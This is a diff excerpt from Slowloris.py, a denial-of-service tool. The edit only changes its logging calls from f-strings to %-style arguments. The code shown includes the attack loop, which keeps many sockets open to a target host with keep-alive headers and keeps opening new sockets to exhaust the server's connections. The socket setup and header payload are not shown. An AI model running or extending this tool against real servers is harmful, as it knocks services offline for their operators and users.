# Slowloris.py

@@ -178,7 +178,7 @@ def init_socket(ip: str):

def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info(f"Socket count: {len(list_of_sockets)}")
    logging.info("Socket count: %s", len(list_of_sockets))

    # Try to send a header line to each socket
    for s in list(list_of_sockets):
@@ -194,15 +194,15 @@ def slowloris_iteration():
    if diff <= 0:
        return

    logging.info(f"Creating {diff} new sockets...")
    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug(f"Failed to create new socket: {e}")
            logging.debug("Failed to create new socket: %s", e)
            break


@@ -228,7 +228,7 @@ def main():
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug(f"Error in Slowloris iteration: {e}")
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)
